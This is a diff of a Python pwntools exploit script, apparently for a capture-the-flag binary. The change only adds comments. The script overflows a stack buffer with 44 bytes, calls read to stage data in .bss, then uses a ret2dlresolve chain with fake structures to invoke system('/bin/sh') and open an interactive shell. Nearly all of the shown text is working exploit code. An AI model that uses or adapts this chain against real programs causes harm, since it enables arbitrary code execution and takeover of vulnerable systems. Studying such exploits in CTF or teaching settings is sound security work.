@@ -14,8 +14,8 @@ resolver = 0x80482f0
 payload2_size = 43
 
 #overflow and jump bss
-payload1 = b"A" * 44
-payload1 += p32(elf.symbols["read"])
+payload1 = b"A" * 44 #overflow and controll PIE
+payload1 += p32(elf.symbols["read"]) #int read(int handle, void *buf, unsigned n);
 payload1 += p32(read_func)
 payload1 += p32(0)
 payload1 += p32(bss)
@@ -56,6 +56,10 @@ payload3 += p32(resolver) #execute _dl_runtime_resolve func
 payload3 += p32(ret_plt_offset) #set fake Structs
 payload3 += p32(0xdeafbeef) #padding
 payload3 += p32(binsh_bss_address)
+
+#--stack--
+#system
+#bin/sh
 
 p.send(payload3)
 p.interactive()
